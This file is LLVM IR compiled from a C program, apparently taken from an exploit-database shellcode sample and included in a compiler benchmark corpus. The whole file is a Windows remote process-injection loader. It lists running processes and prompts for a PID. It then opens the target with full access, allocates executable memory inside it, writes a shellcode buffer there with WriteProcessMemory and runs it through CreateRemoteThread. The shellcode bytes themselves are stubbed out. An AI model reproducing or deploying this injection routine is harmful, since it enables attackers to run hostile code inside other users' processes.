; ModuleID = '/home/carl/AnghaBench/exploitdb/shellcodes/windows_x86-64/extr_42992.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/shellcodes/windows_x86-64/extr_42992.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i32, i8*, i32 }

@shellcode = common dso_local global i32 0, align 4
@TH32CS_SNAPPROCESS = common dso_local global i32 0, align 4
@INVALID_HANDLE_VALUE = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [34 x i8] c"CreateToolhelp32Snapshot() Failed\00", align 1
@.str.1 = private unnamed_addr constant [24 x i8] c"Process32First() Failed\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"%s : %ld\0A\00", align 1
@.str.3 = private unnamed_addr constant [20 x i8] c"\0AEnter Process ID: \00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"%ld\00", align 1
@PROCESS_ALL_ACCESS = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [23 x i8] c"Failed to Open Process\00", align 1
@MEM_COMMIT = common dso_local global i32 0, align 4
@PAGE_EXECUTE_READWRITE = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [37 x i8] c"Failed to allocate memory in process\00", align 1
@PAGE_EXECUTE_READ = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i64, align 8
  %3 = alloca i64, align 8
  %4 = alloca i64, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.TYPE_4__, align 8
  store i32 0, i32* %1, align 4
  %9 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %8, i32 0, i32 0
  store i32 24, i32* %9, align 8
  %10 = load i32, i32* @shellcode, align 4
  %11 = call i32 @strlen(i32 %10)
  store i32 %11, i32* %5, align 4
  %12 = load i32, i32* @TH32CS_SNAPPROCESS, align 4
  %13 = call i64 @CreateToolhelp32Snapshot(i32 %12, i32 0)
  store i64 %13, i64* %2, align 8
  %14 = load i64, i64* %2, align 8
  %15 = load i64, i64* @INVALID_HANDLE_VALUE, align 8
  %16 = icmp eq i64 %14, %15
  br i1 %16, label %17, label %19

17:                                               ; preds = %0
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %73

19:                                               ; preds = %0
  %20 = load i64, i64* %2, align 8
  %21 = call i32 @Process32First(i64 %20, %struct.TYPE_4__* %8)
  %22 = icmp ne i32 %21, 0
  br i1 %22, label %25, label %23

23:                                               ; preds = %19
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.1, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %73

25:                                               ; preds = %19
  br label %26

26:                                               ; preds = %32, %25
  %27 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %8, i32 0, i32 1
  %28 = load i8*, i8** %27, align 8
  %29 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %8, i32 0, i32 2
  %30 = load i32, i32* %29, align 8
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0), i8* %28, i32 %30)
  br label %32

32:                                               ; preds = %26
  %33 = load i64, i64* %2, align 8
  %34 = call i64 @Process32Next(i64 %33, %struct.TYPE_4__* %8)
  %35 = icmp ne i64 %34, 0
  br i1 %35, label %26, label %36

36:                                               ; preds = %32
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.3, i64 0, i64 0))
  %38 = call i32 @scanf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0), i32* %7)
  %39 = load i32, i32* @PROCESS_ALL_ACCESS, align 4
  %40 = load i32, i32* %7, align 4
  %41 = call i64 @OpenProcess(i32 %39, i32 0, i32 %40)
  store i64 %41, i64* %3, align 8
  %42 = load i64, i64* %3, align 8
  %43 = icmp ne i64 %42, 0
  br i1 %43, label %46, label %44

44:                                               ; preds = %36
  %45 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.5, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %73

46:                                               ; preds = %36
  %47 = load i64, i64* %3, align 8
  %48 = load i32, i32* %5, align 4
  %49 = load i32, i32* @MEM_COMMIT, align 4
  %50 = load i32, i32* @PAGE_EXECUTE_READWRITE, align 4
  %51 = call i64 @VirtualAllocEx(i64 %47, i32* null, i32 %48, i32 %49, i32 %50)
  store i64 %51, i64* %4, align 8
  %52 = load i64, i64* %4, align 8
  %53 = icmp ne i64 %52, 0
  br i1 %53, label %56, label %54

54:                                               ; preds = %46
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.6, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %73

56:                                               ; preds = %46
  %57 = load i64, i64* %3, align 8
  %58 = load i64, i64* %4, align 8
  %59 = load i32, i32* @shellcode, align 4
  %60 = load i32, i32* %5, align 4
  %61 = call i32 @WriteProcessMemory(i64 %57, i64 %58, i32 %59, i32 %60, i32* null)
  %62 = load i64, i64* %3, align 8
  %63 = load i64, i64* %4, align 8
  %64 = load i32, i32* %5, align 4
  %65 = load i32, i32* @PAGE_EXECUTE_READ, align 4
  %66 = call i32 @VirtualProtectEx(i64 %62, i64 %63, i32 %64, i32 %65, i32* %6)
  %67 = load i64, i64* %3, align 8
  %68 = load i64, i64* %4, align 8
  %69 = trunc i64 %68 to i32
  %70 = call i32 @CreateRemoteThread(i64 %67, i32* null, i32 0, i32 %69, i32* null, i32 0, i32 0)
  %71 = load i64, i64* %3, align 8
  %72 = call i32 @CloseHandle(i64 %71)
  store i32 0, i32* %1, align 4
  br label %73

73:                                               ; preds = %56, %54, %44, %23, %17
  %74 = load i32, i32* %1, align 4
  ret i32 %74
}

declare dso_local i32 @strlen(i32) #1

declare dso_local i64 @CreateToolhelp32Snapshot(i32, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @Process32First(i64, %struct.TYPE_4__*) #1

declare dso_local i64 @Process32Next(i64, %struct.TYPE_4__*) #1

declare dso_local i32 @scanf(i8*, i32*) #1

declare dso_local i64 @OpenProcess(i32, i32, i32) #1

declare dso_local i64 @VirtualAllocEx(i64, i32*, i32, i32, i32) #1

declare dso_local i32 @WriteProcessMemory(i64, i64, i32, i32, i32*) #1

declare dso_local i32 @VirtualProtectEx(i64, i64, i32, i32, i32*) #1

declare dso_local i32 @CreateRemoteThread(i64, i32*, i32, i32, i32*, i32, i32) #1

declare dso_local i32 @CloseHandle(i64) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
